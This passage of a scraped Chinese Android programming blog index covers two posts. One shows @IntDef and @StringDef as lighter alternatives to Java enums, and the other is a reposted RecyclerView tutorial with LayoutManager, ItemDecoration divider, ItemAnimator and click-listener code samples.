当我们想把一个变量x的取值限制在几个预先定义的常量时，我们会怎么做呢？我们可以先定义一些常量值，然后从这些常量中选择赋值给x。下面，让我们假设变量x为currentDay，它的取值包含了星期天到星期五。我们可以在Java中，通过Integer的常量写出下面的代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class Main &#123; public static final int SUNDAY = 0; public static final int MONDAY = 1; public static final int TUESDAY = 2; public static final int WEDNESDAY = 3; public static final int THURSDAY = 4; public static final int FRIDAY = 5; public static final int SATURDAY = 6; private int currentDay = SUNDAY; public static void main(String[] args) &#123; Main obj = new Main(); obj.setCurrentDay(WEDNESDAY); int today = obj.getCurrentDay(); switch (today) &#123; case SUNDAY: System.out.println(\"Today is SUNDAY\"); break; case MONDAY: System.out.println(\"Today is MONDAY\"); break; case TUESDAY: System.out.println(\"Today is TUESDAY\"); break; case WEDNESDAY: System.out.println(\"Today is WEDNESDAY\"); break; case THURSDAY: System.out.println(\"Today is THURSDAY\"); break; case FRIDAY: System.out.println(\"Today is FRIDAY\"); break; case SATURDAY: System.out.println(\"Today is SATURDAY\"); break; default: break; &#125; &#125; public void setCurrentDay(int currentDay) &#123; this.currentDay = currentDay; &#125; public int getCurrentDay() &#123; return currentDay; &#125; &#125; 但上面的代码会出现的问题是：我可以为currentDay设置任何的int值 1obj.setCurrentDay(100); 这种情况编译器并不会给出任何的错误提示。然后我们的switch/case语句会忽略掉处理这种情况。因此，对于这种情况，Java为我们提供了一种叫Enumeration（或称Enum，枚举）的解决方案。如果使用了Enum枚举，我们的Java代码将会写成下面这样： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class Main &#123; public enum WeekDays &#123; SUNDAY, MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY &#125; private WeekDays currentDay = WeekDays.SUNDAY; public static void main(String[] args) &#123; // TODO Auto-generated method stub Main obj = new Main(); obj.setCurrentDay(WeekDays.WEDNESDAY); WeekDays today = obj.getCurrentDay(); switch (today) &#123; case SUNDAY: System.out.println(\"Today is SUNDAY\"); break; case MONDAY: System.out.println(\"Today is MONDAY\"); break; case TUESDAY: System.out.println(\"Today is TUESDAY\"); break; case WEDNESDAY: System.out.println(\"Today is WEDNESDAY\"); break; case THURSDAY: System.out.println(\"Today is THURSDAY\"); break; case FRIDAY: System.out.println(\"Today is FRIDAY\"); break; case SATURDAY: System.out.println(\"Today is SATURDAY\"); break; default: break; &#125; &#125; public void setCurrentDay(WeekDays currentDay) &#123; this.currentDay = currentDay; &#125; public WeekDays getCurrentDay() &#123; return currentDay; &#125; &#125; 现在我们拥有了类型安全的保障。这里我们不能再为currentDay赋予任何在WeekDays以外的值了。这是一个很大的进步，我们都应该使用多多使用。不过在Android中，这里会存在一些问题。Enum枚举在Android中：Enum在Java中是一个完全成熟的class。在Enum枚举中的每一个值，都是Enum枚举类型中的一个对象实例。因此，Enum枚举值会比我们之前使用的常量类型占用更多的内存。即使在旧Android设备（版本 &lt;= 2.2）上，这里也存在一些由JIT即使编译器解决的，由Enum枚举类型引发的性能问题。现在我们可以在Android应用中使用Enum枚举类型，但如果我们的应用是一种非常吃紧内存的类型或者是游戏应用，那么我们最后使用int常量来代替Enum枚举。但这导致我们上面提及的问题依然存在。 现在我们有了别的解决方案。Android的support Annotation注解库有一些很好的annotation注解来帮助我们更早的发现bug（在编译时期）。IntDef 和 StringDef 是两个非常有魔力的Constant Annotation注解，我们可以使用它们来代替Enum枚举。它们会帮助我们像Enum枚举一样，在编译时期检查变量的赋值情况。下面的代码展示给我们如何使用IntDef代替Enum： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class MainActivity extends Activity &#123; public static final int SUNDAY = 0; public static final int MONDAY = 1; public static final int TUESDAY = 2; public static final int WEDNESDAY = 3; public static final int THURSDAY = 4; public static final int FRIDAY = 5; public static final int SATURDAY = 6; @IntDef(&#123;SUNDAY, MONDAY,TUESDAY,WEDNESDAY,THURSDAY,FRIDAY,SATURDAY&#125;) @Retention(RetentionPolicy.SOURCE) public @interface WeekDays &#123;&#125; @WeekDays int currentDay = SUNDAY; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); setCurrentDay(WEDNESDAY); @WeekDays int today = getCurrentDay(); switch (today)&#123; case SUNDAY: break; case MONDAY: break; case TUESDAY: break; case WEDNESDAY: break; case THURSDAY: break; case FRIDAY: break; case SATURDAY: break; default: break; &#125; &#125; public void setCurrentDay(@WeekDays int currentDay) &#123; this.currentDay = currentDay; &#125; @WeekDays public int getCurrentDay() &#123; return currentDay; &#125;&#125; 现在我们不能再为currentDay和today赋予任何在WeekDays以外的值了。编译器会检查变量的赋值情况，并反馈给我们相应的错误信息。如果我们使用Android Studio，IDE还会向我们提供变量建议的功能（代码提示）。当我们使用时，首先需要定义一些常量： 1234567public static final int SUNDAY = 0;public static final int MONDAY = 1;public static final int TUESDAY = 2;public static final int WEDNESDAY = 3;public static final int THURSDAY = 4;public static final int FRIDAY = 5;public static final int SATURDAY = 6; 然后用@IntDef注解声明这些变量 123@IntDef(&#123;SUNDAY, MONDAY,TUESDAY,WEDNESDAY,THURSDAY,FRIDAY,SATURDAY&#125;)@Retention(RetentionPolicy.SOURCE)public @interface WeekDays &#123;&#125; 我们可以通过下面的代码，设置一个变量为WeekDays类型，让WeekDays以外的值都无法赋给该变量 1@WeekDays int currentDay ; 现在，当我们想为currentDay赋予任何在WeekDays以外的值时，编译器会提示我们相应的错误信息。设置方法的参数以及返回值为WeekDays的方法如下： 1234567public void setCurrentDay(@WeekDays int currentDay) &#123; this.currentDay = currentDay;&#125; @WeekDayspublic int getCurrentDay() &#123; return currentDay; @StringDef也能以同样的方式应用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public class MainActivity extends Activity &#123; public static final String SUNDAY = \"sunday\"; public static final String MONDAY = \"monday\"; public static final String TUESDAY = \"tuesday\"; public static final String WEDNESDAY = \"wednesday\"; public static final String THURSDAY = \"thursday\"; public static final String FRIDAY = \"friday\"; public static final String SATURDAY = \"saturday\"; @StringDef(&#123;SUNDAY, MONDAY,TUESDAY,WEDNESDAY,THURSDAY,FRIDAY,SATURDAY&#125;) @Retention(RetentionPolicy.SOURCE) public @interface WeekDays &#123;&#125; @WeekDays String currentDay = SUNDAY; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); setCurrentDay(WEDNESDAY); @WeekDays String today = getCurrentDay(); switch (today)&#123; case SUNDAY: break; case MONDAY: break; case TUESDAY: break; case WEDNESDAY: break; case THURSDAY: break; case FRIDAY: break; case SATURDAY: break; default: break; &#125; &#125; public void setCurrentDay(@WeekDays String currentDay) &#123; this.currentDay = currentDay; &#125; @WeekDays public String getCurrentDay() &#123; return currentDay; &#125;&#125; 想要使用以上的功能，你需要为你的工程添加support-annotation库的依赖。如果你使用的是Android Studio，那么请在你的Gradle依赖脚本下添加下面代码 12345dependencies &#123; compile fileTree(include: ['*.jar'], dir: 'libs') ... compile 'com.android.support:support-annotations:22.0.0'&#125; 你可以点击这里查看更多关于Android support annotation库的内容。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Android RecyclerView 使用完全解析 体验艺术般的控件","slug":"Android-RecyclerView-使用完全解析-体验艺术般的控件","date":"2017-08-16T09:41:17.000Z","updated":"2020-05-11T07:23:44.508Z","comments":true,"path":"2017/08/16/Android-RecyclerView-使用完全解析-体验艺术般的控件/","link":"","permalink":"https://superxlcr.github.io/2017/08/16/Android-RecyclerView-使用完全解析-体验艺术般的控件/","excerpt":"","text":"补充一下，对于RecyclerView，最麻烦的地方在于编写其Adapter，这里介绍一种比较方便的框架：BRVAH该框架提供了一个RecyclerView的基类，节省了我们为控件设置内容的代码，提供了一键设置HeaderView与FooterView的方法，提供了一些RecyclerView添加item的动画模板，提供列表滑动加载与下拉刷新功能，集成了滑动删除、拖拽item等框架地址：http://www.jianshu.com/p/b343fcff51b0 转载请标明出处：http://blog.csdn.net/lmj623565791/article/details/45059587； 本文出自:【张鸿洋的博客】 概述RecyclerView出现已经有一段时间了，相信大家肯定不陌生了，大家可以通过导入support-v7对其进行使用。 据官方的介绍，该控件用于在有限的窗口中展示大量数据集，其实这样功能的控件我们并不陌生，例如：ListView、GridView。那么有了ListView、GridView为什么还需要RecyclerView这样的控件呢？整体上看RecyclerView架构，提供了一种插拔式的体验，高度的解耦，异常的灵活，通过设置它提供的不同LayoutManager，ItemDecoration , ItemAnimator实现令人瞠目的效果。 你想要控制其显示的方式，请通过布局管理器LayoutManager 你想要控制Item间的间隔（可绘制），请通过ItemDecoration 你想要控制Item增删的动画，请通过ItemAnimator 你想要控制点击、长按事件，请自己写（擦，这点尼玛。） 基本使用鉴于我们对于ListView的使用特别的熟悉，对比下RecyclerView的使用代码： 12345678910mRecyclerView = findView(R.id.id_recyclerview);//设置布局管理器mRecyclerView.setLayoutManager(layout);//设置adaptermRecyclerView.setAdapter(adapter)//设置Item增加、移除动画mRecyclerView.setItemAnimator(new DefaultItemAnimator());//添加分割线mRecyclerView.addItemDecoration(new DividerItemDecoration( getActivity(), DividerItemDecoration.HORIZONTAL_LIST)); ok，相比较于ListView的代码，ListView可能只需要去设置一个adapter就能正常使用了。而RecyclerView基本需要上面一系列的步骤，那么为什么会添加这么多的步骤呢？那么就必须解释下RecyclerView的这个名字了，从它类名上看，RecyclerView代表的意义是，我只管Recycler View，也就是说RecyclerView只管回收与复用View，其他的你可以自己去设置。可以看出其高度的解耦，给予你充分的定制自由（所以你才可以轻松的通过这个控件实现ListView,GirdView，瀑布流等效果）。 Just like ListView Activity 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182package com.zhy.sample.demo_recyclerview;import java.util.ArrayList;import java.util.List;import android.os.Bundle;import android.support.v7.app.ActionBarActivity;import android.support.v7.widget.LinearLayoutManager;import android.support.v7.widget.RecyclerView;import android.support.v7.widget.RecyclerView.ViewHolder;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import android.widget.TextView;public class HomeActivity extends ActionBarActivity&#123; private RecyclerView mRecyclerView; private List&lt;String&gt; mDatas; private HomeAdapter mAdapter; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_single_recyclerview); initData(); mRecyclerView = (RecyclerView) findViewById(R.id.id_recyclerview); mRecyclerView.setLayoutManager(new LinearLayoutManager(this)); mRecyclerView.setAdapter(mAdapter = new HomeAdapter()); &#125; protected void initData() &#123; mDatas = new ArrayList&lt;String&gt;(); for (int i = 'A'; i &lt; 'z'; i++) &#123; mDatas.add(\"\" + (char) i); &#125; &#125; class HomeAdapter extends RecyclerView.Adapter&lt;HomeAdapter.MyViewHolder&gt; &#123; @Override public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) &#123; MyViewHolder holder = new MyViewHolder(LayoutInflater.from( HomeActivity.this).inflate(R.layout.item_home, parent, false)); return holder; &#125; @Override public void onBindViewHolder(MyViewHolder holder, int position) &#123; holder.tv.setText(mDatas.get(position)); &#125; @Override public int getItemCount() &#123; return mDatas.size(); &#125; class MyViewHolder extends ViewHolder &#123; TextView tv; public MyViewHolder(View view) &#123; super(view); tv = (TextView) view.findViewById(R.id.id_num); &#125; &#125; &#125;&#125; Activity的布局文件 12345678910111213&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; &gt; &lt;android.support.v7.widget.RecyclerView android:id=&quot;@+id/id_recyclerview&quot; android:divider=&quot;#ffff0000&quot; android:dividerHeight=&quot;10dp&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; /&gt;&lt;/RelativeLayout&gt; Item的布局文件 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;FrameLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:background=&quot;#44ff0000&quot; android:layout_height=&quot;wrap_content&quot; &gt; &lt;TextView android:id=&quot;@+id/id_num&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;50dp&quot; android:gravity=&quot;center&quot; android:text=&quot;1&quot; /&gt;&lt;/FrameLayout&gt; 这么看起来用法与ListView的代码基本一致哈~~ 看下效果图：看起来好丑，Item间应该有个分割线，当你去找时，你会发现RecyclerView并没有支持divider这样的属性。那么怎么办，你可以给Item的布局去设置margin，当然了这种方式不够优雅，我们文章开始说了，我们可以自由的去定制它，当然我们的分割线也是可以定制的。 ItemDecoration我们可以通过该方法添加分割线： 1mRecyclerView.addItemDecoration() 该方法的参数为RecyclerView.ItemDecoration，该类为抽象类，官方目前并没有提供默认的实现类（我觉得最好能提供几个）。 该类的源码： 1234567891011121314151617181920public static abstract class ItemDecoration &#123;public void onDraw(Canvas c, RecyclerView parent, State state) &#123; onDraw(c, parent); &#125;public void onDrawOver(Canvas c, RecyclerView parent, State state) &#123; onDrawOver(c, parent); &#125;public void getItemOffsets(Rect outRect, View view, RecyclerView parent, State state) &#123; getItemOffsets(outRect, ((LayoutParams) view.getLayoutParams()).getViewLayoutPosition(), parent);&#125;@Deprecatedpublic void getItemOffsets(Rect outRect, int itemPosition, RecyclerView parent) &#123; outRect.set(0, 0, 0, 0); &#125; 当我们调用mRecyclerView.addItemDecoration()方法添加decoration的时候，RecyclerView在绘制的时候，去会绘制decorator，即调用该类的onDraw和onDrawOver方法， onDraw方法先于drawChildren onDrawOver在drawChildren之后，一般我们选择复写其中一个即可。 getItemOffsets 可以通过outRect.set()为每个Item设置一定的偏移量，主要用于绘制Decorator。 接下来我们看一个RecyclerView.ItemDecoration的实现类，该类很好的实现了RecyclerView添加分割线（当使用LayoutManager为LinearLayoutManager时）。 该类参考自：DividerItemDecoration 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110package com.zhy.sample.demo_recyclerview;/* * Copyright (C) 2014 The Android Open Source Project * * Licensed under the Apache License, Version 2.0 (the \"License\"); * limitations under the License. */import android.content.Context;import android.content.res.TypedArray;import android.graphics.Canvas;import android.graphics.Rect;import android.graphics.drawable.Drawable;import android.support.v7.widget.LinearLayoutManager;import android.support.v7.widget.RecyclerView;import android.support.v7.widget.RecyclerView.State;import android.util.Log;import android.view.View;/** * This class is from the v7 samples of the Android SDK. It's not by me! * &lt;p/&gt; * See the license above for details. */public class DividerItemDecoration extends RecyclerView.ItemDecoration &#123; private static final int[] ATTRS = new int[]&#123; android.R.attr.listDivider &#125;; public static final int HORIZONTAL_LIST = LinearLayoutManager.HORIZONTAL; public static final int VERTICAL_LIST = LinearLayoutManager.VERTICAL; private Drawable mDivider; private int mOrientation; public DividerItemDecoration(Context context, int orientation) &#123; final TypedArray a = context.obtainStyledAttributes(ATTRS); mDivider = a.getDrawable(0); a.recycle(); setOrientation(orientation); &#125; public void setOrientation(int orientation) &#123; if (orientation != HORIZONTAL_LIST &amp;&amp; orientation != VERTICAL_LIST) &#123; throw new IllegalArgumentException(\"invalid orientation\"); &#125; mOrientation = orientation; &#125; @Override public void onDraw(Canvas c, RecyclerView parent) &#123; Log.v(\"recyclerview - itemdecoration\", \"onDraw()\"); if (mOrientation == VERTICAL_LIST) &#123; drawVertical(c, parent); &#125; else &#123; drawHorizontal(c, parent); &#125; &#125; public void drawVertical(Canvas c, RecyclerView parent) &#123; final int left = parent.getPaddingLeft(); final int right = parent.getWidth() - parent.getPaddingRight(); final int childCount = parent.getChildCount(); for (int i = 0; i &lt; childCount; i++) &#123; final View child = parent.getChildAt(i); android.support.v7.widget.RecyclerView v = new android.support.v7.widget.RecyclerView(parent.getContext()); final RecyclerView.LayoutParams params = (RecyclerView.LayoutParams) child .getLayoutParams(); final int top = child.getBottom() + params.bottomMargin; final int bottom = top + mDivider.getIntrinsicHeight(); mDivider.setBounds(left, top, right, bottom); mDivider.draw(c); &#125; &#125; public void drawHorizontal(Canvas c, RecyclerView parent) &#123; final int top = parent.getPaddingTop(); final int bottom = parent.getHeight() - parent.getPaddingBottom(); final int childCount = parent.getChildCount(); for (int i = 0; i &lt; childCount; i++) &#123; final View child = parent.getChildAt(i); final RecyclerView.LayoutParams params = (RecyclerView.LayoutParams) child .getLayoutParams(); final int left = child.getRight() + params.rightMargin; final int right = left + mDivider.getIntrinsicHeight(); mDivider.setBounds(left, top, right, bottom); mDivider.draw(c); &#125; &#125; @Override public void getItemOffsets(Rect outRect, int itemPosition, RecyclerView parent) &#123; if (mOrientation == VERTICAL_LIST) &#123; outRect.set(0, 0, 0, mDivider.getIntrinsicHeight()); &#125; else &#123; outRect.set(0, 0, mDivider.getIntrinsicWidth(), 0); &#125; &#125;&#125; 该实现类可以看到通过读取系统主题中的 Android.R.attr.listDivider作为Item间的分割线，并且支持横向和纵向。如果你不清楚它是怎么做到的读取系统的属性用于自身，请参考我的另一篇博文：Android 深入理解Android中的自定义属性获取到listDivider以后，该属性的值是个Drawable，在getItemOffsets中，outRect去设置了绘制的范围。onDraw中实现了真正的绘制。我们在原来的代码中添加一句： 12mRecyclerView.addItemDecoration(new DividerItemDecoration(this,DividerItemDecoration.VERTICAL_LIST)); ok，现在再运行，就可以看到分割线的效果了。该分割线是系统默认的，你可以在theme.xml中找到该属性的使用情况。那么，使用系统的listDivider有什么好处呢？就是方便我们去随意的改变，该属性我们可以直接声明在： 1234&lt;!-- Application theme. --&gt; &lt;style name=&quot;AppTheme&quot; parent=&quot;AppBaseTheme&quot;&gt; &lt;item name=&quot;android:listDivider&quot;&gt;@drawable/divider_bg&lt;/item&gt; &lt;/style&gt; 然后自己写个drawable即可，下面我们换一种分隔符： 123456789101112&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;shape xmlns:android=\"http://schemas.android.com/apk/res/android\" android:shape=\"rectangle\" &gt; &lt;gradient android:centerColor=\"#ff00ff00\" android:endColor=\"#ff0000ff\" android:startColor=\"#ffff0000\" android:type=\"linear\" /&gt; &lt;size android:height=\"4dp\"/&gt;&lt;/shape&gt; 现在的样子是：当然了，你可以根据自己的需求，去随意的绘制，反正是画出来的，随便玩~~ok，看到这，你可能觉得，这玩意真尼玛麻烦，完全不能比拟的心爱的ListView。那么继续看。 LayoutManager好了，上面实现了类似ListView样子的Demo，通过使用其默认的LinearLayoutManager。RecyclerView.LayoutManager吧，这是一个抽象类，好在系统提供了3个实现类： LinearLayoutManager 现行管理器，支持横向、纵向。 GridLayoutManager 网格布局管理器 StaggeredGridLayoutManager 瀑布就式布局管理器 上面我们已经初步体验了下LinearLayoutManager，接下来看GridLayoutManager。 GridLayoutManager 我们尝试去实现类似GridView，秒秒钟的事情： 12//mRecyclerView.setLayoutManager(new LinearLayoutManager(this)); mRecyclerView.setLayoutManager(new GridLayoutManager(this,4)); 只需要修改LayoutManager即可，还是很nice的。当然了，改为GridLayoutManager以后，对于分割线，前面的DividerItemDecoration就不适用了，主要是因为它在绘制的时候，比如水平线，针对每个child的取值为： 12final int left = parent.getPaddingLeft();final int right = parent.getWidth() - parent.getPaddingRight(); 因为每个Item一行，这样是没问题的。而GridLayoutManager时，一行有多个childItem，这样就多次绘制了，并且GridLayoutManager时，Item如果为最后一列（则右边无间隔线）或者为最后一行（底部无分割线）。针对上述，我们编写了DividerGridItemDecoration。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177package com.zhy.sample.demo_recyclerview;import android.content.Context;import android.content.res.TypedArray;import android.graphics.Canvas;import android.graphics.Rect;import android.graphics.drawable.Drawable;import android.support.v7.widget.GridLayoutManager;import android.support.v7.widget.RecyclerView;import android.support.v7.widget.RecyclerView.LayoutManager;import android.support.v7.widget.RecyclerView.State;import android.support.v7.widget.StaggeredGridLayoutManager;import android.view.View;/** * * @author zhy * */public class DividerGridItemDecoration extends RecyclerView.ItemDecoration&#123; private static final int[] ATTRS = new int[] &#123; android.R.attr.listDivider &#125;; private Drawable mDivider; public DividerGridItemDecoration(Context context) &#123; final TypedArray a = context.obtainStyledAttributes(ATTRS); mDivider = a.getDrawable(0); a.recycle(); &#125; @Override public void onDraw(Canvas c, RecyclerView parent, State state) &#123; drawHorizontal(c, parent); drawVertical(c, parent); &#125; private int getSpanCount(RecyclerView parent) &#123; // 列数 int spanCount = -1; LayoutManager layoutManager = parent.getLayoutManager(); if (layoutManager instanceof GridLayoutManager) &#123; spanCount = ((GridLayoutManager) layoutManager).getSpanCount(); &#125; else if (layoutManager instanceof StaggeredGridLayoutManager) &#123; spanCount = ((StaggeredGridLayoutManager) layoutManager) .getSpanCount(); &#125; return spanCount; &#125; public void drawHorizontal(Canvas c, RecyclerView parent) &#123; int childCount = parent.getChildCount(); for (int i = 0; i &lt; childCount; i++) &#123; final View child = parent.getChildAt(i); final RecyclerView.LayoutParams params = (RecyclerView.LayoutParams) child .getLayoutParams(); final int left = child.getLeft() - params.leftMargin; final int right = child.getRight() + params.rightMargin + mDivider.getIntrinsicWidth(); final int top = child.getBottom() + params.bottomMargin; final int bottom = top + mDivider.getIntrinsicHeight(); mDivider.setBounds(left, top, right, bottom); mDivider.draw(c); &#125; &#125; public void drawVertical(Canvas c, RecyclerView parent) &#123; final int childCount = parent.getChildCount(); for (int i = 0; i &lt; childCount; i++) &#123; final View child = parent.getChildAt(i); final RecyclerView.LayoutParams params = (RecyclerView.LayoutParams) child .getLayoutParams(); final int top = child.getTop() - params.topMargin; final int bottom = child.getBottom() + params.bottomMargin; final int left = child.getRight() + params.rightMargin; final int right = left + mDivider.getIntrinsicWidth(); mDivider.setBounds(left, top, right, bottom); mDivider.draw(c); &#125; &#125; private boolean isLastColum(RecyclerView parent, int pos, int spanCount, int childCount) &#123; LayoutManager layoutManager = parent.getLayoutManager(); if (layoutManager instanceof GridLayoutManager) &#123; if ((pos + 1) % spanCount == 0)// 如果是最后一列，则不需要绘制右边 &#123; return true; &#125; &#125; else if (layoutManager instanceof StaggeredGridLayoutManager) &#123; int orientation = ((StaggeredGridLayoutManager) layoutManager) .getOrientation(); if (orientation == StaggeredGridLayoutManager.VERTICAL) &#123; if ((pos + 1) % spanCount == 0)// 如果是最后一列，则不需要绘制右边 &#123; return true; &#125; &#125; else &#123; childCount = childCount - childCount % spanCount; if (pos &gt;= childCount)// 如果是最后一列，则不需要绘制右边 return true; &#125; &#125; return false; &#125; private boolean isLastRaw(RecyclerView parent, int pos, int spanCount, int childCount) &#123; LayoutManager layoutManager = parent.getLayoutManager(); if (layoutManager instanceof GridLayoutManager) &#123; childCount = childCount - childCount % spanCount; if (pos &gt;= childCount)// 如果是最后一行，则不需要绘制底部 return true; &#125; else if (layoutManager instanceof StaggeredGridLayoutManager) &#123; int orientation = ((StaggeredGridLayoutManager) layoutManager) .getOrientation(); // StaggeredGridLayoutManager 且纵向滚动 if (orientation == StaggeredGridLayoutManager.VERTICAL) &#123; childCount = childCount - childCount % spanCount; // 如果是最后一行，则不需要绘制底部 if (pos &gt;= childCount) return true; &#125; else // StaggeredGridLayoutManager 且横向滚动 &#123; // 如果是最后一行，则不需要绘制底部 if ((pos + 1) % spanCount == 0) &#123; return true; &#125; &#125; &#125; return false; &#125; @Override public void getItemOffsets(Rect outRect, int itemPosition, RecyclerView parent) &#123; int spanCount = getSpanCount(parent); int childCount = parent.getAdapter().getItemCount(); if (isLastRaw(parent, itemPosition, spanCount, childCount))// 如果是最后一行，则不需要绘制底部 &#123; outRect.set(0, 0, mDivider.getIntrinsicWidth(), 0); &#125; else if (isLastColum(parent, itemPosition, spanCount, childCount))// 如果是最后一列，则不需要绘制右边 &#123; outRect.set(0, 0, 0, mDivider.getIntrinsicHeight()); &#125; else &#123; outRect.set(0, 0, mDivider.getIntrinsicWidth(), mDivider.getIntrinsicHeight()); &#125; &#125;&#125; 主要在getItemOffsets方法中，去判断如果是最后一行，则不需要绘制底部；如果是最后一列，则不需要绘制右边，整个判断也考虑到了StaggeredGridLayoutManager的横向和纵向，所以稍稍有些复杂。最重要还是去理解，如何绘制什么的不重要。一般如果仅仅是希望有空隙，还是去设置item的margin方便。最后的效果是：ok，看到这，你可能还觉得RecyclerView不够强大？但是如果我们有这么个需求，纵屏的时候显示为ListView，横屏的时候显示两列的GridView，我们RecyclerView可以轻松搞定，而如果使用ListView去实现还是需要点功夫的~当然了，这只是皮毛，下面让你心服口服。 StaggeredGridLayoutManager 瀑布流式的布局，其实他可以实现GridLayoutManager一样的功能，仅仅按照下列代码： 12// mRecyclerView.setLayoutManager(new GridLayoutManager(this,4)); mRecyclerView.setLayoutManager(new StaggeredGridLayoutManager(4, StaggeredGridLayoutManager.VERTICAL)); 这两种写法显示的效果是一致的，但是注意StaggeredGridLayoutManager构造的第二个参数传一个orientation，如果传入的是StaggeredGridLayoutManager.VERTICAL代表有多少列；那么传入的如果是StaggeredGridLayoutManager.HORIZONTAL就代表有多少行，比如本例如果改为： 12mRecyclerView.setLayoutManager(new StaggeredGridLayoutManager(4, StaggeredGridLayoutManager.HORIZONTAL)); 那么效果为：可以看到，固定为4行，变成了左右滑动。有一点需要注意，如果是横向的时候，item的宽度需要注意去设置，毕竟横向的宽度没有约束了，应为控件可以横向滚动了。 如果你需要一样横向滚动的GridView，那么恭喜你。ok，接下来准备看大招，如果让你去实现个瀑布流，最起码不是那么随意就可以实现的吧？但是，如果使用RecyclerView，分分钟的事。 那么如何实现？其实你什么都不用做，只要使用StaggeredGridLayoutManager我们就已经实现了，只是上面的item布局我们使用了固定的高度，下面我们仅仅在适配器的onBindViewHolder方法中为我们的item设置个随机的高度（代码就不贴了，最后会给出源码下载地址），看看效果图：是不是棒棒哒，通过RecyclerView去实现ListView、GridView、瀑布流的效果基本上没有什么区别，而且可以仅仅通过设置不同的LayoutManager即可实现。还有更nice的地方，就在于item增加、删除的动画也是可配置的。接下来看一下ItemAnimator。 ItemAnimatorItemAnimator也是一个抽象类，好在系统为我们提供了一种默认的实现类，期待系统多 添加些默认的实现。借助默认的实现，当Item添加和移除的时候，添加动画效果很简单: 12// 设置item动画mRecyclerView.setItemAnimator(new DefaultItemAnimator()); 系统为我们提供了一个默认的实现，我们为我们的瀑布流添加以上一行代码，效果为：如果是GridLayoutManager呢？动画效果为：注意，这里更新数据集不是用adapter.notifyDataSetChanged()而是 notifyItemInserted(position)与notifyItemRemoved(position) 否则没有动画效果。 上述为adapter中添加了两个方法： 123456789public void addData(int position) &#123; mDatas.add(position, \"Insert One\"); notifyItemInserted(position); &#125; public void removeData(int position) &#123; mDatas.remove(position); notifyItemRemoved(position); &#125; Activity中点击MenuItem触发： 123456789101112131415161718192021@Overridepublic boolean onCreateOptionsMenu(Menu menu)&#123; getMenuInflater().inflate(R.menu.main, menu); return super.onCreateOptionsMenu(menu);&#125;@Overridepublic boolean onOptionsItemSelected(MenuItem item)&#123; switch (item.getItemId()) &#123; case R.id.id_action_add: mAdapter.addData(1); break; case R.id.id_action_delete: mAdapter.removeData(1); break; &#125; return true;&#125; 好了，到这我对这个控件已经不是一般的喜欢了~当然了只提供了一种动画，那么我们肯定可以去自定义各种nice的动画效果。 高兴的是，github上已经有很多类似的项目了，这里我们直接引用下：RecyclerViewItemAnimators，大家自己下载查看。 提供了SlideInOutLeftItemAnimator,SlideInOutRightItemAnimator,SlideInOutTopItemAnimator,SlideInOutBottomItemAnimator等动画效果。 Click and LongClick不过一个挺郁闷的地方就是，系统没有提供ClickListener和LongClickListener。 不过我们也可以自己去添加，只是会多了些代码而已。 实现的方式比较多，你可以通过mRecyclerView.addOnItemTouchListener去监听然后去判断手势， 当然你也可以通过adapter中自己去提供回调，这里我们选择后者，前者的方式，大家有兴趣自己去实现。那么代码也比较简单： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class HomeAdapter extends RecyclerView.Adapter&lt;HomeAdapter.MyViewHolder&gt;&#123;//... public interface OnItemClickLitener &#123; void onItemClick(View view, int position); void onItemLongClick(View view , int position); &#125; private OnItemClickLitener mOnItemClickLitener; public void setOnItemClickLitener(OnItemClickLitener mOnItemClickLitener) &#123; this.mOnItemClickLitener = mOnItemClickLitener; &#125; @Override public void onBindViewHolder(final MyViewHolder holder, final int position) &#123; holder.tv.setText(mDatas.get(position)); // 如果设置了回调，则设置点击事件 if (mOnItemClickLitener != null) &#123; holder.itemView.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; int pos = holder.getLayoutPosition(); mOnItemClickLitener.onItemClick(holder.itemView, pos); &#125; &#125;); holder.itemView.setOnLongClickListener(new OnLongClickListener() &#123; @Override public boolean onLongClick(View v) &#123; int pos = holder.getLayoutPosition(); mOnItemClickLitener.onItemLongClick(holder.itemView, pos); return false; &#125; &#125;); &#125; &#125;//...&#125; adapter中自己定义了个接口，然后在onBindViewHolder中去为holder.itemView去设置相应 的监听最后回调我们设置的监听。最后别忘了给item添加一个drawable: 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;selector xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; &gt; &lt;item android:state_pressed=&quot;true&quot; android:drawable=&quot;@color/color_item_press&quot;&gt;&lt;/item&gt; &lt;item 